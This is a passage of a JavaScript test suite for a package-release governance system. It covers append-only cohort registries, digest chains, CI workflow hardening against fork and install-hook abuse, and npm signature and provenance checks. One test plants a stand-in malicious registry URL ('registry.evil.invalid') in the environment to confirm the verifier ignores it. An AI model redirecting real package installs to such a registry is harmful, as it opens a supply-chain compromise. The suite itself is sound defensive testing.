import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";
import test from "node:test";

import YAML from "yaml";

import {
  assertDocsCohortAppendOnly,
  cohortEventDigest,
  cohortRecordDigest,
  collectRepositoryInventoryPages,
  docsRuntimeClosureAuthority,
  docsRuntimeClosureEvidence,
  docsRuntimeClosureProjection,
  observeStableRepositoryInventory,
  qualifiedCohortProjection,
  recommendedDocsCohort,
  validateDocsGovernanceReferences,
  validateDocsConsumerLock,
  validateDocsProtocolExceptions,
  validateDocsQualifiedCohorts,
} from "./docs-cohort-policy.mjs";
import { loadJson } from "./governance-policy.mjs";
import {
  renderCallerWorkflowTemplate,
  resolvePublishedRuntimeClosure,
  verifyChangedDocsCohortEvidence,
  verifyDocsAdmissionEvidence,
  verifyDocsCohortEvidence,
  verifyInstalledPackageSignatures,
} from "./verify-docs-cohort-evidence.mjs";
import {
  validateCohortLifecycleChangedFiles,
  validateEmergencyCohortAppend,
} from "./check-cohort-emergency-append.mjs";
import { resolveForkParents } from "./observe-org-repository-inventory.mjs";

const registrySchema = await loadJson("governance/docs-qualified-cohorts.schema.json");
const authoritativeRegistry = await loadJson("governance/docs-qualified-cohorts.json");
const emptyRegistry = { ...structuredClone(authoritativeRegistry), cohorts: [], events: [] };
const exceptionsSchema = await loadJson("governance/docs-protocol-exceptions.schema.json");
const exceptions = await loadJson("governance/docs-protocol-exceptions.json");
const docsPolicy = await loadJson("governance/docs-protocol-policy.json");
const securityPolicy = await loadJson("governance/code-security-defaults.json");
const appendOnlyWorkflow = await readFile(
  ".github/workflows/docs-cohort-append-only.yml",
  "utf8",
);
const admissionWorkflow = await readFile(
  ".github/workflows/docs-admission-evidence.yml",
  "utf8",
);
const ciWorkflow = await readFile(".github/workflows/ci.yml", "utf8");
const qualifiedWorkflowSource = await readFile(
  ".github/workflows/docs-protocol-check.yml",
);
const producerCallerFixture = await readFile(
  "scripts/fixtures/producer-docs-protocol.yml",
);
const INTEGRITY = `sha512-${"A".repeat(86)}==`;
const ASSET_CONTENTS = {
  "skills/docs/SKILL.md": "trusted skill\n",
  "assets/docs-protocol.yml": "uses: {{REUSABLE_WORKFLOW_REPOSITORY}}/{{REUSABLE_WORKFLOW_PATH}}@{{REUSABLE_WORKFLOW_REVISION}}\n",
  "assets/catalog.json": "{}\n",
  "assets/transition-catalog.json": "{\"schemaVersion\":1,\"transitions\":[]}\n",
};
const assetDigest = (path) => `sha256:${createHash("sha256").update(ASSET_CONTENTS[path]).digest("hex")}`;
const renderedCallerDigest = () => `sha256:${createHash("sha256").update(
  "uses: agent-teams-ai/.github/.github/workflows/docs-protocol-check.yml@" + "2".repeat(40) + "\n",
).digest("hex")}`;

function runtimeLock() {
  const foundation = "@agent-teams/engineering-foundation@0.18.0-rc.0";
  const docs = "@agent-teams/docs-protocol@0.2.0-rc.0";
  return {
    lockfileVersion: "9.0",
    importers: { ".": { devDependencies: {
      "@agent-teams/engineering-foundation": { specifier: "0.18.0-rc.0", version: "0.18.0-rc.0" },
      "@agent-teams/docs-protocol": { specifier: "0.2.0-rc.0", version: "0.2.0-rc.0" },
    } } },
    packages: {
      [foundation]: { resolution: { integrity: INTEGRITY } },
      [docs]: { resolution: { integrity: INTEGRITY } },
    },
    snapshots: {
      [foundation]: {},
      [docs]: { dependencies: { "@agent-teams/engineering-foundation": "0.18.0-rc.0" } },
    },
  };
}

function runtimeClosure() {
  return docsRuntimeClosureAuthority(runtimeLock(), [
    { name: "@agent-teams/engineering-foundation", version: "0.18.0-rc.0", integrity: INTEGRITY },
    { name: "@agent-teams/docs-protocol", version: "0.2.0-rc.0", integrity: INTEGRITY },
  ]);
}

function runtimeClosureEvidence() {
  return docsRuntimeClosureEvidence(runtimeLock(), [
    { name: "@agent-teams/engineering-foundation", version: "0.18.0-rc.0", integrity: INTEGRITY },
    { name: "@agent-teams/docs-protocol", version: "0.2.0-rc.0", integrity: INTEGRITY },
  ]);
}

function cohort() {
  const provenance = (name, version) => ({
    source_repository: "agent-teams-ai/engineering-foundation",
    source_repository_id: 1316243988,
    source_workflow: ".github/workflows/release.yml",
    source_commit: "1".repeat(40),
    workflow_run_id: 123,
    workflow_run_attempt: 1,
    registry_attestation_url: `https://registry.npmjs.org/-/npm/v1/attestations/${name.replace("/", "%2f")}@${version}`,
    workflow_run_url: "https://github.com/agent-teams-ai/engineering-foundation/actions/runs/123",
    signature_verified: true,
  });
  const record = {
    cohort_id: "docs-2026-08-18-rc1",
    channel: "rc",
    packages: [
      {
        name: "@agent-teams/engineering-foundation",
        version: "0.18.0-rc.0",
        integrity: INTEGRITY,
        registry: "https://registry.npmjs.org/",
        published_at: "2026-08-16T00:00:00Z",
        provenance: provenance("@agent-teams/engineering-foundation", "0.18.0-rc.0"),
      },
      {
        name: "@agent-teams/docs-protocol",
        version: "0.2.0-rc.0",
        integrity: INTEGRITY,
        registry: "https://registry.npmjs.org/",
        published_at: "2026-08-16T00:00:00Z",
        provenance: provenance("@agent-teams/docs-protocol", "0.2.0-rc.0"),
      },
    ],
    reusable_workflow: {
      repository: "agent-teams-ai/.github",
      repository_id: 1316243981,
      path: ".github/workflows/docs-protocol-check.yml",
      revision: "2".repeat(40),
      blob_sha: "3".repeat(40),
    },
    schemas: {
      consumer_integration: 1,
      consumer_plan: 1,
      managed_state: 1,
      foundation_plan: 1,
      foundation_journal: 1,
      foundation_receipt: 1,
      foundation_envelope: 5,
      docs_protocol: 1,
    },
    assets: {
      skill: { package: "@agent-teams/docs-protocol", path: "skills/docs/SKILL.md", digest: assetDigest("skills/docs/SKILL.md") },
      caller_workflow: {
        package: "@agent-teams/docs-protocol",
        path: "assets/docs-protocol.yml",
        digest: assetDigest("assets/docs-protocol.yml"),
        rendered_digest: renderedCallerDigest(),
      },
      asset_catalog: { package: "@agent-teams/docs-protocol", path: "assets/catalog.json", digest: assetDigest("assets/catalog.json") },
      transition_catalog: { package: "@agent-teams/docs-protocol", path: "assets/transition-catalog.json", digest: assetDigest("assets/transition-catalog.json") },
    },
    runtime: {
      node: ">=24.18.0 <25",
      pnpm: ">=11.17.0 <12",
      apply_platforms: ["linux", "macos"],
      check_plan_platforms: ["linux", "macos", "windows"],
    },
    runtime_closure: runtimeClosure(),
    eligible_after: "2026-08-18T00:00:00Z",
    upgrade_from: [],
    rollback_to: [],
    canary_repositories: [{
      repository_id: 1314129620,
      repository: "agent-teams-ai/agent-runtime",
    }],
    evidence_references: ["https://github.com/agent-teams-ai/engineering-foundation/actions/runs/123"],
    record_digest: `sha256:${"0".repeat(64)}`,
  };
  record.record_digest = cohortRecordDigest(record);
  return record;
}

function registry(states = ["PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED"]) {
  const result = structuredClone(emptyRegistry);
  result.cohorts.push(cohort());
  let previous = null;
  for (const [index, state] of states.entries()) {
    const event = {
      sequence: index + 1,
      cohort_id: result.cohorts[0].cohort_id,
      state,
      effective_at: [
        "2026-08-16T00:00:00Z",
        "2026-08-16T01:00:00Z",
        "2026-08-16T02:00:00Z",
        "2026-08-18T00:00:00Z",
        "2026-08-18T01:00:00Z",
        "2026-08-18T02:00:00Z",
      ][index],
      support_until: null,
      evidence_references: [`governance/evidence/${index + 1}.json`],
      canary_evidence: [],
      previous_event_digest: previous,
      event_digest: `sha256:${"0".repeat(64)}`,
    };
    if (state === "CANARY") {
      const qualified = result.events.find(({ state: priorState }) => priorState === "QUALIFIED");
      event.canary_evidence = [{
        repository_id: 1314129620,
        repository: "agent-teams-ai/agent-runtime",
        merge_revision: "7".repeat(40),
        observed_cohort_id: result.cohorts[0].cohort_id,
        observed_record_digest: result.cohorts[0].record_digest,
        observed_event_digest: qualified.event_digest,
        required_context: "docs-protocol / docs-protocol-check",
        integration_id: 15368,
        conclusion: "success",
        check_run_id: 456,
        check_run_url: "https://github.com/agent-teams-ai/agent-runtime/actions/runs/123/job/456",
        workflow_run_id: 123,
        workflow_id: 789,
        caller_workflow_path: ".github/workflows/docs-protocol.yml",
        caller_workflow_digest: result.cohorts[0].assets.caller_workflow.rendered_digest,
      }];
    }
    event.event_digest = cohortEventDigest(event);
    previous = event.event_digest;
    result.events.push(event);
  }
  return result;
}

function defaultBranchEvidence(repository, revision) {
  return {
    default_branch: "main",
    revision,
    required_context: "docs-protocol / docs-protocol-check",
    integration_id: 15368,
    conclusion: "success",
    check_run_id: 456,
    check_run_url: `https://github.com/${repository}/actions/runs/123/job/456`,
    workflow_run_id: 123,
    workflow_id: 789,
    caller_workflow_path: ".github/workflows/docs-protocol.yml",
    caller_workflow_digest: renderedCallerDigest(),
    observed_at: "2026-08-19T04:00:00Z",
  };
}

test("accepts the empty bootstrap registry and one complete qualification chain", () => {
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    structuredClone(authoritativeRegistry),
    registrySchema,
  ));
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(structuredClone(emptyRegistry), registrySchema));
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    registry(),
    registrySchema,
    { asOf: "2026-08-18T00:00:00Z" },
  ));
});

test("keeps append-only enforcement trusted and bootstrap-aware", () => {
  assert.match(appendOnlyWorkflow, /pull_request_target:/u);
  assert.match(appendOnlyWorkflow, /edited/u);
  assert.match(appendOnlyWorkflow, /contents: read/u);
  assert.match(appendOnlyWorkflow, /pull-requests: read/u);
  assert.match(appendOnlyWorkflow, /actions\/github-script@[0-9a-f]{40}/u);
  assert.match(appendOnlyWorkflow, /load\(pull\.base\.sha, true\)/u);
  assert.match(appendOnlyWorkflow, /load\(pull\.head\.sha\)/u);
  assert.match(appendOnlyWorkflow, /ref: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/u);
  assert.match(appendOnlyWorkflow, /DOCS_COHORT_BASE_PATH/u);
  assert.match(appendOnlyWorkflow, /verify-docs-cohort-evidence\.mjs/u);
  assert.match(appendOnlyWorkflow,
    /Verify live evidence[\s\S]*DOCS_COHORT_EVIDENCE_REF: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/u);
  assert.match(appendOnlyWorkflow, /--changed-from/u);
  assert.match(appendOnlyWorkflow, /writeFile\(headPath, head/u);
  assert.match(appendOnlyWorkflow, /actions: read/u);
  assert.match(appendOnlyWorkflow, /checks: read/u);
  assert.match(appendOnlyWorkflow, /PR base is stale/u);
  assert.match(appendOnlyWorkflow, /previous_filename/u);
  assert.match(appendOnlyWorkflow, /pull\.base\.ref !== controller\.data\.default_branch/u);
  assert.match(appendOnlyWorkflow, /changedFileCap = 3000/u);
  assert.match(appendOnlyWorkflow, /changed\.length !== pull\.changed_files/u);
  assert.match(appendOnlyWorkflow, /github\.paginate/u);
  assert.match(appendOnlyWorkflow, /core\.setOutput\("mode", "noop"\)/u);
  assert.match(appendOnlyWorkflow, /outputs\.mode != 'noop'/u);
  assert.match(appendOnlyWorkflow, /allowedEvidence/u);
  assert.match(appendOnlyWorkflow, /file\.status !== "added"/u);
  assert.match(appendOnlyWorkflow, /outputs\.mode == 'emergency'/u);
  assert.match(appendOnlyWorkflow, /check-cohort-emergency-append\.mjs/u);
  assert.match(appendOnlyWorkflow, /outputs\.mode == 'full'[\s\S]*pnpm install/u);
  assert.doesNotMatch(appendOnlyWorkflow, /pull_request\.head\.repo/u);
  const authorityClassifier = appendOnlyWorkflow.indexOf("const changedAuthority");
  const unrelatedNoop = appendOnlyWorkflow.indexOf("if (!changesRegistry)");
  assert.ok(authorityClassifier >= 0 && authorityClassifier < unrelatedNoop,
    "authority-only changes must fail before unrelated PRs take the no-op path");
  assert.match(appendOnlyWorkflow, /\[filename, prior\][\s\S]*authorityPaths\.has/u);
  assert.match(appendOnlyWorkflow, /\.pnpmfile\.cjs/u);
  assert.match(appendOnlyWorkflow, /authorityPaths\.has\(entry\) \|\| isInstallAuthority\(entry\)/u);
  assert.match(appendOnlyWorkflow, /pnpm install --frozen-lockfile --ignore-scripts\s+--ignore-pnpmfile/u);
  assert.doesNotMatch(appendOnlyWorkflow, /pnpm install --frozen-lockfile --ignore-scripts\s+--ignore-pnpmfile --ignore-workspace/u);
  assert.match(appendOnlyWorkflow, /"package\.json"/u);
  assert.match(appendOnlyWorkflow, /"pnpm-lock\.yaml"/u);
  assert.match(appendOnlyWorkflow, /"governance\/docs-qualified-cohorts\.schema\.json"/u);
  assert.doesNotMatch(appendOnlyWorkflow, /authorityPaths[\s\S]{0,500}"README\.md"/u);
});

test("keeps admission credentials out of PR-head execution", () => {
  assert.doesNotMatch(ciWorkflow, /DOCS_GOVERNANCE_READ_TOKEN|secrets\./u);
  assert.match(admissionWorkflow, /pull_request_target:/u);
  assert.match(admissionWorkflow, /ref: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/u);
  assert.match(admissionWorkflow, /pull\.head\.repo\.full_name !==/u);
  assert.match(admissionWorkflow, /Admission changes from forks are not eligible/u);
  assert.match(admissionWorkflow, /getContent[\s\S]*ref: pull\.head\.sha/u);
  assert.match(admissionWorkflow, /DOCS_GOVERNANCE_READ_TOKEN: \$\{\{ secrets\.DOCS_GOVERNANCE_READ_TOKEN \}\}/u);
  assert.match(admissionWorkflow, /verify-docs-admission-change\.mjs/u);
  assert.match(admissionWorkflow, /\.pnpmfile\.cjs/u);
  assert.match(admissionWorkflow, /hardAuthority\.has\(entry\) \|\| isInstallAuthority\(entry\)/u);
  const admissionScope = admissionWorkflow.indexOf("const changesAdmission");
  const unrelatedNoop = admissionWorkflow.indexOf("if (!changesAdmission)");
  const authorityClassifier = admissionWorkflow.indexOf("const authority");
  assert.ok(admissionScope >= 0 && admissionScope < unrelatedNoop &&
    unrelatedNoop < authorityClassifier,
  "unrelated Cohort PRs must no-op before admission-only authority classification");
  assert.match(admissionWorkflow, /pnpm install --frozen-lockfile --ignore-scripts\s+--ignore-pnpmfile/u);
  assert.doesNotMatch(admissionWorkflow, /pnpm install --frozen-lockfile --ignore-scripts\s+--ignore-pnpmfile --ignore-workspace/u);
  assert.doesNotMatch(admissionWorkflow, /pull_request\.head\.repo[\s\S]*actions\/checkout/u);
});

test("materializes a first PUBLISHED Cohort closure from the exact PR head", () => {
  assert.match(appendOnlyWorkflow, /allowedRuntimeClosure/u);
  assert.match(appendOnlyWorkflow, /headCohorts\.slice\(baseCohorts\.length\)/u);
  assert.match(appendOnlyWorkflow, /requiredNewClosures[\s\S]*addedClosures/u);
  assert.match(appendOnlyWorkflow, /status === "added" && prior === undefined/u);
  assert.match(appendOnlyWorkflow, /New runtime closure evidence must be create-only and referenced exactly/u);
  assert.match(appendOnlyWorkflow,
    /Verify live evidence[\s\S]*DOCS_COHORT_EVIDENCE_REF: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/u);
});

test("rejects a renamed predecessor package-manager hook before either trusted install", () => {
  for (const trustedWorkflow of [appendOnlyWorkflow, admissionWorkflow]) {
    assert.match(trustedWorkflow, /previous_filename/u);
    assert.match(trustedWorkflow, /\[filename, prior\]|allPaths\(file\)/u);
    assert.match(trustedWorkflow, /isInstallAuthority\(entry\)/u);
    assert.match(trustedWorkflow, /\.pnpmfile\.cjs/u);
  }
});

test("validates a negative emergency append without npm or third-party modules", () => {
  const previous = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const current = structuredClone(previous);
  const event = {
    sequence: current.events.length + 1,
    cohort_id: current.cohorts[0].cohort_id,
    state: "SUSPENDED",
    effective_at: "2026-08-18T03:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/docs-cohorts/emergency.json"],
    canary_evidence: [],
    previous_event_digest: current.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  event.event_digest = cohortEventDigest(event);
  current.events.push(event);
  assert.equal(validateEmergencyCohortAppend(
    previous, current, Date.parse("2026-08-18T03:00:00Z"),
  ), 1);
  current.policy.authority = "forged";
  assert.throws(() => validateEmergencyCohortAppend(
    previous, current, Date.parse("2026-08-18T03:00:00Z"),
  ), /cannot change Cohort policy/u);

  const cooldownFree = registry(["PUBLISHED_UNQUALIFIED", "VERIFIED", "QUALIFIED"]);
  const withdrawn = structuredClone(cooldownFree);
  const withdrawal = {
    sequence: withdrawn.events.length + 1,
    cohort_id: withdrawn.cohorts[0].cohort_id,
    state: "WITHDRAWN",
    effective_at: "2026-08-18T03:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/docs-cohorts/withdrawal.json"],
    canary_evidence: [],
    previous_event_digest: withdrawn.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  withdrawal.event_digest = cohortEventDigest(withdrawal);
  withdrawn.events.push(withdrawal);
  assert.equal(validateEmergencyCohortAppend(
    cooldownFree, withdrawn, Date.parse("2026-08-18T03:00:00Z"),
  ), 1);
});

test("rejects malformed or backdated dependency-free emergency events", () => {
  const previous = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const mutateAndValidate = (mutate) => {
    const current = structuredClone(previous);
    const event = {
      sequence: current.events.length + 1,
      cohort_id: current.cohorts[0].cohort_id,
      state: "SUSPENDED",
      effective_at: "2026-08-18T03:00:00Z",
      support_until: null,
      evidence_references: ["governance/evidence/docs-cohorts/emergency.json"],
      canary_evidence: [],
      previous_event_digest: current.events.at(-1).event_digest,
      event_digest: `sha256:${"0".repeat(64)}`,
    };
    mutate(event);
    event.event_digest = cohortEventDigest(event);
    current.events.push(event);
    return () => validateEmergencyCohortAppend(
      previous, current, Date.parse("2026-08-18T03:00:00Z"),
    );
  };
  for (const mutation of [
    (event) => {event.effective_at = "2026-08-17T23:59:59Z";},
    (event) => {event.evidence_references = ["x", "x"];},
    (event) => {event.evidence_references = ["x".repeat(2049)];},
    (event) => {event.support_until = "2026-08-19T00:00:00Z";},
    (event) => {event.canary_evidence = [{}];},
  ]) {
    assert.throws(mutateAndValidate(mutation));
  }
});

test("rejects authority changes, deletes, and both sides of lifecycle renames", () => {
  assert.doesNotThrow(() => validateCohortLifecycleChangedFiles([
    { filename: "governance/docs-qualified-cohorts.json", status: "modified" },
    { filename: "governance/evidence/docs-cohorts/suspend-1.json", status: "added" },
  ]));
  for (const files of [
    [{ filename: "package.json", status: "modified" }],
    [{ filename: "scripts/verify-docs-cohort-evidence.mjs", status: "modified" }],
    [{ filename: "governance/docs-qualified-cohorts.json", status: "removed" }],
    [{
      filename: "governance/evidence/docs-cohorts/new.json",
      previous_filename: "scripts/validator.mjs",
      status: "renamed",
    }],
  ]) {
    assert.throws(() => validateCohortLifecycleChangedFiles(files),
      /forbidden authority|cannot be renamed|newly added inert/u);
  }
});

test("rejects mutation, deletion, digest drift, and invalid lifecycle transitions", () => {
  const previous = registry();
  const changed = structuredClone(previous);
  changed.cohorts[0].assets.skill.digest = `sha256:${"9".repeat(64)}`;
  assert.throws(() => assertDocsCohortAppendOnly(previous, changed), /immutable/u);
  assert.throws(() => validateDocsQualifiedCohorts(
    changed,
    registrySchema,
    { asOf: "2026-08-18T00:00:00Z" },
  ), /record digest/u);
  const invalid = registry(["PUBLISHED_UNQUALIFIED", "QUALIFIED"]);
  assert.throws(() => validateDocsQualifiedCohorts(
    invalid,
    registrySchema,
    { asOf: "2026-08-18T00:00:00Z" },
  ), /transition/u);
  const skippedCanary = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "RECOMMENDED",
  ]);
  assert.throws(() => validateDocsQualifiedCohorts(
    skippedCanary,
    registrySchema,
    { asOf: "2026-08-18T02:00:00Z" },
  ), /transition/u);
});

test("projects the exact central record and lifecycle event into consumer shape", () => {
  const recommended = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const projection = qualifiedCohortProjection(
    recommended,
    recommended.cohorts[0].cohort_id,
    { asOf: "2026-08-18T02:00:00Z" },
  );
  assert.equal(projection.recordDigest, recommended.cohorts[0].record_digest);
  assert.equal(projection.qualificationEventDigest, recommended.events.find(({ state }) => state === "QUALIFIED").event_digest);
  assert.equal("lifecycleState" in projection, false);
  assert.equal(projection.canaryRepositoryIds, undefined);
  assert.equal(projection.assets.callerWorkflowDigest,
    recommended.cohorts[0].assets.caller_workflow.rendered_digest);
});

test("keeps consumer projection byte-identical across mutable lifecycle events", () => {
  const recommended = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const suspended = structuredClone(recommended);
  const event = {
    sequence: suspended.events.length + 1,
    cohort_id: suspended.cohorts[0].cohort_id,
    state: "SUSPENDED",
    effective_at: "2026-08-18T03:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/suspension.json"],
    canary_evidence: [],
    previous_event_digest: suspended.events.at(-1).event_digest,
    event_digest: `sha256:${"0".repeat(64)}`,
  };
  event.event_digest = cohortEventDigest(event);
  suspended.events.push(event);
  assert.deepEqual(
    qualifiedCohortProjection(recommended, recommended.cohorts[0].cohort_id, {
      asOf: "2026-08-18T02:00:00Z",
    }),
    qualifiedCohortProjection(suspended, suspended.cohorts[0].cohort_id, {
      asOf: "2026-08-18T03:00:00Z",
    }),
  );
});

test("requires exact canary evidence and never falls back after suspension", () => {
  const recommended = registry([
    "PUBLISHED_UNQUALIFIED", "VERIFIED", "COOLDOWN", "QUALIFIED", "CANARY", "RECOMMENDED",
  ]);
  const badCanary = structuredClone(recommended);
  badCanary.events.find(({ state }) => state === "CANARY").canary_evidence[0].repository_id = 999;
  const canary = badCanary.events.find(({ state }) => state === "CANARY");
  canary.event_digest = cohortEventDigest(canary);
  const recommendedEvent = badCanary.events.at(-1);
  recommendedEvent.previous_event_digest = canary.event_digest;
  recommendedEvent.event_digest = cohortEventDigest(recommendedEvent);
  assert.throws(() => validateDocsQualifiedCohorts(
    badCanary,
    registrySchema,
    { asOf: "2026-08-18T02:00:00Z" },
  ), /exact declared canary set/u);

  const suspended = structuredClone(recommended);
  const event = {
    sequence: suspended.events.length + 1,
    cohort_id: suspended.cohorts[0].cohort_id,
    state: "SUSPENDED",
    effective_at: "2026-08-18T03:00:00Z",
    support_until: null,
    evidence_references: ["governance/evidence/suspension.json"],
    canary_evidence: [],
    previous_event_digest: suspended.events.at(-1).event_digest,
    event_digest: `sha256:${"1".repeat(64)}`,
  };
  event.event_digest = cohortEventDigest(event);
  suspended.events.push(event);
  assert.equal(recommendedDocsCohort(
    suspended,
    { asOf: "2026-08-18T03:00:00Z" },
  ), undefined);
});

test("treats eligible_after as informational and rejects future-dated lifecycle evidence", () => {
  const tooYoung = registry();
  tooYoung.cohorts[0].eligible_after = "2026-08-16T12:00:00Z";
  tooYoung.cohorts[0].record_digest = cohortRecordDigest(tooYoung.cohorts[0]);
  assert.doesNotThrow(() => validateDocsQualifiedCohorts(
    tooYoung,
    registrySchema,
    { asOf: "2026-08-18T00:00:00Z" },
  ));
  assert.throws(() => validateDocsQualifiedCohorts(
    registry(),
    registrySchema,
    { asOf: "2026-08-17T23:59:59Z" },
  ), /future/u);
});

test("validates expiring enumerable exceptions at a declared date", () => {
  assert.doesNotThrow(() => validateDocsProtocolExceptions(
    structuredClone(exceptions),
    exceptionsSchema,
    { asOf: "2026-08-16" },
  ));
  assert.throws(() => validateDocsProtocolExceptions(
    structuredClone(exceptions),
    exceptionsSchema,
    { asOf: "2026-11-17" },
  ), /expired/u);
  assert.throws(() => validateDocsProtocolExceptions(
    structuredClone(exceptions),
    exceptionsSchema,
    { asOf: "2026-09-16" },
  ), /review is due/u);
});

test("collects 101+ repositories without truncating at the first API page", async () => {
  const source = Array.from({ length: 205 }, (_value, index) => ({ id: index + 1 }));
  const observedPages = [];
  const result = await collectRepositoryInventoryPages(({ page, perPage }) => {
    observedPages.push(page);
    const start = (page - 1) * perPage;
    return Promise.resolve(source.slice(start, start + perPage));
  });
  assert.deepEqual(result, source);
  assert.deepEqual(observedPages, [1, 2, 3, 4]);
  await assert.rejects(collectRepositoryInventoryPages(({ page }) =>
    Promise.resolve(page === 1 ? [{ id: 1 }] : page === 2 ? [{ id: 1 }] : [])), /repeats/u);
});

test("rejects inventory drift across complete paginated observations", async () => {
  let pass = 0;
  await assert.rejects(observeStableRepositoryInventory(({ page }) => {
    if (page === 1) {pass += 1;}
    if (page > 1) {return Promise.resolve([]);}
    return Promise.resolve([{ id: pass === 1 ? 1 : 2 }]);
  }), /changed during observation/u);
});

test("resolves fork parent from individual repository metadata, not the org list", async () => {
  const repositories = await resolveForkParents([{
    id: 42,
    full_name: "agent-teams-ai/craig-meeting-gateway",
    fork: true,
  }], async () => ({
    id: 42,
    full_name: "agent-teams-ai/craig-meeting-gateway",
    fork: true,
    parent: { full_name: "CraigChat/craig" },
  }));
  assert.equal(repositories[0].fork_parent, "CraigChat/craig");
  await assert.rejects(resolveForkParents([{
    id: 42, full_name: "agent-teams-ai/craig-meeting-gateway", fork: true,
  }], async () => ({ id: 42, full_name: "agent-teams-ai/craig-meeting-gateway", fork: true })),
  /fork metadata is incomplete/u);
});

test("installs exact packages before npm cryptographic signature audit", async () => {
  const calls = [];
  const priorRegistry = process.env.NPM_CONFIG_REGISTRY;
  process.env.NPM_CONFIG_REGISTRY = "https://registry.evil.invalid/";
  try {
    await verifyInstalledPackageSignatures(cohort().packages, async (program, args, options) => {
      calls.push([program, args, options]);
      assert.equal(options.env.NPM_CONFIG_REGISTRY, undefined);
      assert.match(options.env.NPM_CONFIG_USERCONFIG, /\/user\.npmrc$/u);
      assert.match(options.env.NPM_CONFIG_GLOBALCONFIG, /\/global\.npmrc$/u);
      assert.notEqual(
        options.env.NPM_CONFIG_USERCONFIG,
        options.env.NPM_CONFIG_GLOBALCONFIG,
      );
      assert.equal(await readFile(options.env.NPM_CONFIG_USERCONFIG, "utf8"), "");
      assert.equal(await readFile(options.env.NPM_CONFIG_GLOBALCONFIG, "utf8"), "");
      assert.ok(args.includes("--registry=https://registry.npmjs.org/"));
      return { stdout: args[0] === "audit" ? JSON.stringify({
        invalid: [],
        missing: [],
        verified: [
          ...cohort().packages.map(({ name, version }) => ({ name, version })),
          { name: "yaml", version: "2.9.0", attestationBundles: [] },
        ],
      }) : "", stderr: "" };
    });
  } finally {
    if (priorRegistry === undefined) {delete process.env.NPM_CONFIG_REGISTRY;}
    else {process.env.NPM_CONFIG_REGISTRY = priorRegistry;}
  }
  assert.equal(calls.length, 2);
  assert.deepEqual(calls.map(([, args]) => args.slice(0, 2)), [
    ["install", "--ignore-scripts"],
    ["audit", "signatures"],
  ]);
  assert.ok(calls[1][1].includes("--json"));
  assert.ok(calls[1][1].includes("--include-attestations"));
  assert.equal(calls[0][1].includes("--package-lock-only"), false);
});

test("derives the qualified runtime closure with the fixed isolated pnpm resolver", async () => {
  const calls = [];
  const observed = await resolvePublishedRuntimeClosure(cohort().packages,
    async (program, args, options) => {
      calls.push([program, args, options]);
      assert.equal(await readFile(options.env.NPM_CONFIG_USERCONFIG, "utf8"), "");
      assert.equal(await readFile(options.env.NPM_CONFIG_GLOBALCONFIG, "utf8"), "");
      const root = args[args.indexOf("--dir") + 1];
      await writeFile(join(root, "pnpm-lock.yaml"), YAML.stringify(runtimeLock()));
      return { stdout: "", stderr: "" };
    });
  assert.deepEqual(observed, runtimeClosureEvidence());
  assert.equal(calls.length, 1);
  assert.equal(calls[0][0], "pnpm");
  assert.ok(calls[0][1].includes("--lockfile-only"));
  assert.ok(calls[0][1].includes("--ignore-scripts"));
  assert.ok(calls[0][1].includes("--ignore-pnpmfile"));
  assert.ok(calls[0][1].includes("--ignore-workspace"));
  assert.match(calls[0][2].env.NPM_CONFIG_USERCONFIG, /\/user\.npmrc$/u);
  assert.match(calls[0][2].env.NPM_CONFIG_GLOBALCONFIG, /\/global\.npmrc$/u);
  assert.notEqual(
    calls[0][2].env.NPM_CONFIG_USERCONFIG,
    calls[0][2].env.NPM_CONFIG_GLOBALCONFIG,
  );
});

function verifierAdapters(record, overrides = {}) {
  const integrityHex = Buffer.from(INTEGRITY.slice("sha512-".length), "base64").toString("hex");
  const attestationFor = (entry) => {
    const statement = {
      subject: [{ name: `${entry.name}@${entry.version}`, digest: { sha512: integrityHex } }],
      predicate: {
        buildDefinition: {
          externalParameters: { workflow: {
            repository: "https://github.com/agent-teams-ai/engineering-foundation",
            path: entry.provenance.source_workflow,
          } },
          resolvedDependencies: [{ digest: { gitCommit: entry.provenance.source_commit } }],
        },
        runDetails: { metadata: { invocationId: `${entry.provenance.workflow_run_url}/attempts/1` } },
      },
    };
    return {
      predicateType: "https://slsa.dev/provenance/v1",
      bundle: { dsseEnvelope: { payload: Buffer.from(JSON.stringify(statement)).toString("base64") } },
    };
  };
  return {
    asOf: "2026-08-18T02:00:00Z",
    npmView: async (specifier) => {
      const entry = record.packages.find(({ name, version }) => specifier === `${name}@${version}`);
      return { dist: { integrity: entry.integrity, attestations: { url: entry.provenance.registry_attestation_url } } };
    },
    npmTimes: async (name) => Object.fromEntries(record.packages
      .filter((entry) => entry.name === name)
      .map((entry) => [entry.version, entry.published_at])),
    fetchJson: async (url) => {
      const entry = record.packages.find(({ provenance }) => provenance.registry_attestation_url === url);
      return { attestations: [attestationFor(entry)] };
    },
    verifySignatures: async () => record.packages.map((entry) => ({
      name: entry.name,
      version: entry.version,
      registry: "https://registry.npmjs.org/",
      attestations: { url: entry.provenance.registry_attestation_url },
      attestationBundles: [attestationFor(entry)],
    })),
    resolveRuntimeClosure: async () => runtimeClosureEvidence(),
    readRuntimeClosureEvidence: async () => runtimeClosureEvidence().source,
